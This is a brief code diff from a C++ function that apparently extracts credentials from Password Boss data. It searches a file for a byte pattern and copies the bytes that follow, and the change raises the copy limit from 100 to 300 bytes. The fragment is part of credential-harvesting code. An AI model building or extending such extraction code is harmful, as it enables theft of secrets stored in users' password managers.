@@ -23,11 +23,11 @@ int getCredspasswordbossapp2(std::string filename) {
         if (c == searchPattern[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 100 data limit
+                // We found the search pattern, now collect data until reaching the 300 data limit
                 std::vector<unsigned char> extractedData;
                 int dataCount = 0;
 
-                while (dataCount < 100 && !file.eof()) {
+                while (dataCount < 300 && !file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
                     extractedData.push_back(c);
                     dataCount++;
